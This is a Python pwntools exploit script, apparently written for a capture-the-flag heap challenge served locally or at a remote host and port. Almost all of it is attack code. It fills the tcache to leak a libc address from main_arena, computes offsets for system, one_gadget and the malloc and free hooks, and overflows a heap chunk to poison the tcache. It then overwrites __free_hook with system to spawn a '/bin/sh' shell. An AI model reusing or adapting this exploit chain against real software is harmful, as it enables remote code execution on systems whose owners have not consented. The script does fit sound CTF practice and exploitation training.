import time
from pwn import *
import sys

if(len(sys.argv)>1):
	run_local = False
else:
	run_local = True




SIZE=90

if "REMOTE" not in args:
	r= process('./test')
else:
	r = remote("jinblack.it",3004)


global pkm_number
pkm_number=0
def alloc0(name,size,art):
	r.recvuntil(b"> ")
	r.sendline(b"0")
	r.recvuntil(b"> ")
	r.sendline(b"%s" % name)
	r.recvuntil(b"> ")
	r.sendline(b"%d" % size)
	sleep(0.1)
	r.send(b"%s" % art)

def edit0(index,name,size,art):
	r.recvuntil(b"> ")
	r.sendline(b"3")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)
	r.recvuntil(b"> ")
	r.sendline(b"%s" % name)
	r.recvuntil(b"> ")
	r.sendline(b"%d" % size)
	sleep(0.1)
	r.send(b"%s" % art)
	print(pkm_number)

def kill0(index):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)

def print2(index):
	r.recvuntil(b"> ")
	r.sendline(b"4")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)
	tounpack=r.recvuntil(b"Name: ")
	print(tounpack)	
	tounpack=r.recvuntil(b">")
	print(tounpack)	



def write0(index,data):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"Index: ")
	r.sendline(b"%d" % index)
	r.recvuntil(b"Content: ")
	r.send(data)
	#r.recvuntil(b"Options: ")[:-len("Options:")]
gdb.attach(r)
input("wait")

kill0(0)

alloc0(b'A'*50,0x100,b'A'*0x100)
alloc0(b'B'*50,0x100,b'B'*50)
input("wait")
alloc0(b'C'*50,0x100,b'C'*50)
input("wait")
alloc0(b'D'*50,0x100,b'D'*50)
alloc0(b'E'*50,0x100,b'E'*50)
alloc0(b'F'*50,0x100,b'F'*50)
alloc0(b'G'*50,0x100,b'G'*50)
alloc0(b'H'*50,0x100,b'H'*50)
alloc0(b'I'*50,0x100,b'I'*50)
alloc0(b'J'*50,0x100,b'I'*50)

kill0(3)
kill0(4)
kill0(5)
kill0(6)
kill0(7)
kill0(8)
kill0(9)
#PUT ALL IN TCACHE EXCEPT CHUNK IN WHICH WE CAN OVERFLOW WITH ART NAME

kill0(1)
#NOW CONTAINS POINTER TO MAIN ARENA

alloc0(b'B'*50,0x100,b'B'*50)
alloc0(b'C'*50,0x100,b'C'*50)
alloc0(b'/bin/sh\x00',0x100,b'D'*50)
alloc0(b'E'*50,0x100,b'E'*50)
alloc0(b'F'*50,0x100,b'F'*50)
alloc0(b'G'*50,0x100,b'G'*50)
alloc0(b'H'*50,0x100,b'H'*50)
alloc0(b'I',0x100,b'K'*8)
#STUPIDLY REALLOCATE EVERYTHING, BUT 1 WILL ONLY HAVE THE FIRST WORD FILLED


r.sendline(b'1')
r.recvuntil(b'art#> ')
r.sendline(b'9')


#PRINT



r.recvuntil(b'KKKKKKKK')
leak=r.recvuntil(b'B')[:-1]
print("[!]LEAK: "+hex(u64(leak)))

libc=u64(leak)-0x3ebca0
mhook=libc+0x3ebc30
chunk=mhook-0x23
system=libc+0x4f440
one=libc+0x4f2c5
#one=libc+0x4f322
#one=libc+0x10a38c
binsh=libc+0x1b3e9a
fhook=libc+0x3ed8e8
print("[!]LIBC: "+hex(libc))
print("[!]MALLOC_HOOK: "+hex(mhook))
print("[!]ONE_GADGET: "+hex(one))
print("[!]FREE HOOK: "+hex(fhook))
#r.interactive()



overflow=b'A'*0x100+p64(0)+p64(0x71)+p64(0x666)*12
overflow+=p64(0)+p64(0x111)+p64(0x666)*32
overflow+=p64(0x110)+p64(0x31)+p64(fhook)
edit0(0,b'A'*50,0x300,overflow)
edit0(9,p64(system),10,b'topo')

r.interactive()
